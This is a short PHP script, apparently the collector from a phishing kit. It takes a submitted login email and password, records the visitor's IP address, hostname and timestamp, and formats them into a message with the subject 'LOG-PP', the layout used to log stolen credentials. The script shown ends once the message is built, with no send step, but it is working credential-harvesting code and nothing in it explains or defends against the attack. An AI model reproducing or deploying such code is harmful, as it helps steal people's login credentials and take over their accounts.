<?php


	$ip = getenv("REMOTE_ADDR");
	$datamasii=date("D M d, Y - g:i a");
	$hostname = gethostbyaddr($ip);


$login_email = $_POST['login_email'];
$login_password = $_POST['login_password'];

$msg = "
email: $login_email
pass: $login_password
---------------------------------------------
time : $datamasii
ip : $ip
======================= said =====================
";
$subject = "LOG-PP  | $ip";



?>